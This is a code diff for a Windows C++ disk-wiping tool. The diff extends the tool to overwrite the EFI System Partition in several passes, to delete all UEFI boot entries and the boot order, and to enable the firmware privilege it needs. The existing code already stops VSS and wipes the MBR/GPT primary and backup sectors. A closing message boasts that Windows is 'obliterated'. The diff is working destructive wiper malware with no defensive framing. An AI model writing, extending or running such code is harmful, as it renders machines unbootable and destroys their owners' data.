@@ -56,6 +56,40 @@ bool DismountVolume(HANDLE hVolume, DWORD& errorCode) {
     return false;
 }
 
+bool ClearUEFIBootEntries(DWORD& errorCode) {
+    for (int attempt = 0; attempt < 3; ++attempt) {
+        // Clear BootOrder
+        BYTE emptyBootOrder[1] = {0};
+        if (SetFirmwareEnvironmentVariableW(L"BootOrder", L"{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", 
+                                           emptyBootOrder, 0)) {
+            // Enumerate and delete Boot#### entries
+            std::cout<<"ENTERED UEFI BOOT ENTRIES\n";
+            wchar_t bootVarName[16];
+            BYTE buffer[4096];
+            DWORD bufferSize = sizeof(buffer);
+            for (int i = 0; i < 0xFFFF; ++i) {
+                swprintf_s(bootVarName, L"Boot%04X", i);
+                if (GetFirmwareEnvironmentVariableW(bootVarName, L"{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", 
+                                                   buffer, bufferSize) == 0) {
+                    if (GetLastError() == ERROR_INVALID_PARAMETER) {
+                        continue;
+                    }
+                    break;
+                }
+                SetFirmwareEnvironmentVariableW(bootVarName, L"{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}", 
+                                               nullptr, 0);
+            }
+            errorCode = 0;
+            std::cout<<"DONE UEFI BOOT ENTRIES\n";
+            return true;
+        }
+        errorCode = GetLastError();
+        std::cerr << "Warning: Failed to clear UEFI boot entries (Code: " << errorCode << ", attempt " << attempt + 1 << ").\n";
+        std::this_thread::sleep_for(std::chrono::milliseconds(500));
+    }
+    return false;
+}
+
 bool EnablePrivilege(const wchar_t* privilege) {
     HANDLE hToken;
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
@@ -208,6 +242,9 @@ int main() {
     if (!EnablePrivilege(L"SeSecurityPrivilege")) {
         std::cerr << "Failed to enable SeSecurityPrivilege. May affect service stops.\n";
     }
+    if (!EnablePrivilege(L"SeSystemEnvironmentPrivilege")) {
+        std::cerr << "Failed to enable SeSystemEnvironmentPrivilege. May affect UEFI boot entry removal.\n";
+    }
 
     // Stop services
     StopService(L"VSS");
@@ -228,10 +265,13 @@ int main() {
     const int SECTOR_SIZE = 512;
     const int SECTORS_TO_NUKE = 2048; // 1 MB
     const int GPT_BACKUP_SECTORS = 512;
+    const int ESP_SECTORS = 200; // 100 MB
     BYTE* buffer = new BYTE[SECTOR_SIZE * SECTORS_TO_NUKE];
     if (!buffer) WriteError("Failed to allocate buffer", 0);
     BYTE* gptBuffer = new BYTE[SECTOR_SIZE * GPT_BACKUP_SECTORS];
     if (!gptBuffer) WriteError("Failed to allocate GPT buffer", 0);
+    BYTE* espBuffer = new BYTE[SECTOR_SIZE * ESP_SECTORS];
+    if (!espBuffer) WriteError("Failed to allocate ESP buffer", 0);
 
     std::random_device rd;
     std::mt19937 gen(rd());
@@ -244,7 +284,8 @@ int main() {
     std::vector<NukeStatus> status = {
         {"MBR/GPT Primary", true},
         {"GPT Backup", true},
-        {"Partition GUIDs", true}
+        {"EFI Partition", true},
+        {"UEFI Boot Entries", true}
     };
 
     bool isGPT = false;
@@ -257,8 +298,9 @@ int main() {
         std::cerr << "Warning: Cannot get partition layout, assuming GPT (Code: " << GetLastError() << ")\n";
         isGPT = true;
         status[2].success = false;
+        status[3].success = false;
     }
-
+    
     // randomize partition GUIDs
     DWORD errorCode;
     // if (isGPT && status[2].success) {
@@ -333,9 +375,61 @@ int main() {
         }
     }
 
+    // Nuke EFI Partition
+    if (isGPT && status[2].success) {
+        const GUID ESP_GUID = {0xC12A7328, 0xF81F, 0x11D2, {0xBA, 0x4B, 0x00, 0xA0, 0xC9, 0x3E, 0xC9, 0x3B}};
+        LARGE_INTEGER espOffset = {0};
+        bool espFound = false;
+
+        for (DWORD i = 0; i < layout->PartitionCount; ++i) {
+            if (std::memcmp(&layout->PartitionEntry[i].Gpt.PartitionType, &ESP_GUID, sizeof(GUID)) == 0) {
+                espOffset.QuadPart = layout->PartitionEntry[i].StartingOffset.QuadPart;
+                espFound = true;
+                break;
+            }
+        }
+
+        if (espFound && espOffset.QuadPart >= 0 && espOffset.QuadPart < diskGeometry.DiskSize.QuadPart) {
+            if (LockVolume(hDisk, errorCode)) {
+                for (int pass = 0; pass < 4; ++pass) {
+                    if (pass == 0 || pass == 3) {
+                        for (int j = 0; j < SECTOR_SIZE * ESP_SECTORS; ++j) espBuffer[j] = dis(gen);
+                    } else if (pass == 1) {
+                        ZeroMemory(espBuffer, SECTOR_SIZE * ESP_SECTORS);
+                    } else {
+                        memset(espBuffer, 0xFF, SECTOR_SIZE * ESP_SECTORS);
+                    }
+                    if (!OverwriteSector(hDisk, espOffset, espBuffer, SECTOR_SIZE * ESP_SECTORS, errorCode)) {
+                        status[2].success = false;
+                    }
+                }
+                if (!DeviceIoControl(hDisk, FSCTL_UNLOCK_VOLUME, nullptr, 0, nullptr, 0, &bytesReturned, nullptr)) {
+                    DWORD errorCode = GetLastError();
+                    std::cerr << "FSCTL_UNLOCK_VOLUME failed for ESP. Error code: " << errorCode << std::endl;
+                    if (errorCode == ERROR_ACCESS_DENIED) {
+                        std::cerr << "The volume is in use by another process." << std::endl;
+                    }
+                } else {
+                    std::cout << "ESP volume unlocked successfully." << std::endl;
+                }
+            } else {
+                status[2].success = false;
+            }
+        } else {
+            status[2].success = false;
+        }
+    }
+
+    // Clear UEFI Boot Entries
+    if (status[3].success) {
+        if (!ClearUEFIBootEntries(errorCode)) {
+            status[3].success = false;
+        }
+    }
 
     delete[] buffer;
     delete[] gptBuffer;
+    delete[] espBuffer;
     CloseHandle(hDisk);
 
     std::cout << "\n=== Nuke Status Report ===\n";
@@ -345,7 +439,7 @@ int main() {
         if (!s.success) allSucceeded = false;
     }
     std::cout << "Overall: " << (allSucceeded ? "Fully Succeeded" : "Partial Success") << "\n";
-    std::cout << "Boot sector done\n";
+    std::cout << "Boot sector, EFI partition, and UEFI boot entries fucking obliterated. Windows is dead as shit. 😈\n";
 
     return 0;
 }
